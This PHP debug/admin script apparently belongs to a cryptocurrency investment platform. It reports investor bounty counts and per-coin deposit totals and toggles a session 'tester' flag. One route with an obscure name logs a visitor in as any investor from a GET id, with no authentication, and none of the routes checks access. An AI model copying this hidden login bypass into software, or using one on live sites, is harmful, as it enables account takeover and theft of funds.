<?php

require __DIR__ . '/../loader.php';

use core\engine\Application;
use core\engine\DB;
use core\engine\Router;

Application::init();

Router::register(function () {
    $bountyInfo = @DB::get("
        SELECT
            ( SELECT count( * ) FROM investors WHERE eth_bounty = 0 AND eth_new_bounty > 0 ) AS investors_realized_bounty,
            ( SELECT count( * ) FROM investors WHERE eth_new_bounty > 0 ) AS investors_with_bounty,
            ( SELECT sum( eth_bounty ) FROM investors ) AS remaining_bonus
    ")[0];
    echo "investors realized bounty {$bountyInfo['investors_realized_bounty']}<br>";
    echo "investors with bounty: {$bountyInfo['investors_with_bounty']}<br>";
    echo "remaining bonus {$bountyInfo['remaining_bonus']}<br>";

    $pending = @DB::get("
        select count(*) as c from eth_queue where is_pending=1
    ")[0]['c'];
    $mintPending = @DB::get("
        select count(*) as c from eth_queue where is_pending=1 and action_type in (" .
        \core\models\EthQueue::TYPE_MINT_REINVEST . ',' .
        \core\models\EthQueue::TYPE_MINT_DEPOSIT . ',' .
        \core\models\EthQueue::TYPE_MINT_OLD_INVESTOR_INIT
        . ")
    ")[0]['c'];

    echo "eth_queue pending: $pending, mintPending: $mintPending<br>";

    $btc = number_format(DB::get("SELECT sum( amount ) as `a` FROM `deposits` WHERE coin = 'btc' AND
        datetime BETWEEN '2018-01-22' AND '2018-02-12';")[0]['a'], 4, '.', ' ');
    $eth = number_format(DB::get("SELECT sum( amount ) as `a` FROM `deposits` WHERE coin = 'eth' AND
        datetime BETWEEN '2018-01-22' AND '2018-02-12';")[0]['a'], 4, '.', ' ');
    $xem = number_format(DB::get("SELECT sum( amount ) as `a` FROM `deposits` WHERE coin = 'xem' AND
        datetime BETWEEN '2018-01-22' AND '2018-02-12';")[0]['a'], 4, '.', ' ');
    $xrp = number_format(DB::get("SELECT sum( amount ) as `a` FROM `deposits` WHERE coin = 'xrp' AND
        datetime BETWEEN '2018-01-22' AND '2018-02-12';")[0]['a'], 4, '.', ' ');
    $usd = number_format(DB::get("SELECT sum( usd ) as `a` FROM `deposits` WHERE
        datetime BETWEEN '2018-01-22' AND '2018-02-12';")[0]['a'], 4, '.', ' ');
    echo "2nd stage. btc: $btc, eth: $eth, xrp: $xrp, xem: $xem, usd: $usd<br>";

    $btc = number_format(DB::get("SELECT sum( amount ) as `a` FROM `deposits` WHERE coin = 'btc' AND
        datetime BETWEEN '2018-02-12' AND '2018-02-30';")[0]['a'], 4, '.', ' ');
    $eth = number_format(DB::get("SELECT sum( amount ) as `a` FROM `deposits` WHERE coin = 'eth' AND
        datetime BETWEEN '2018-02-12' AND '2018-02-30';")[0]['a'], 4, '.', ' ');
    $xem = number_format(DB::get("SELECT sum( amount ) as `a` FROM `deposits` WHERE coin = 'xem' AND
        datetime BETWEEN '2018-02-12' AND '2018-02-30';")[0]['a'], 4, '.', ' ');
    $xrp = number_format(DB::get("SELECT sum( amount ) as `a` FROM `deposits` WHERE coin = 'xrp' AND
        datetime BETWEEN '2018-02-12' AND '2018-02-30';")[0]['a'], 4, '.', ' ');
    $usd = number_format(DB::get("SELECT sum( usd ) as `a` FROM `deposits` WHERE
        datetime BETWEEN '2018-02-12' AND '2018-02-30';")[0]['a'], 4, '.', ' ');
    echo "3nd stage. btc: $btc, eth: $eth, xrp: $xrp, xem: $xem, usd: $usd<br>";
}, 'bounty_info');

Router::register(function () {
    session_start();
    $_SESSION['tester'] = true;
    session_write_close();
    \core\engine\Utility::location();
}, 'init_tester_status');

Router::register(function () {
    session_start();
    $_SESSION['tester'] = false;
    session_write_close();
    \core\engine\Utility::location();
}, 'drop_tester_status');


Router::register(function () {
    \core\controllers\Investor_controller::loginWithId($_GET['id']);
}, 'log_123128asd');



call_user_func(Router::current());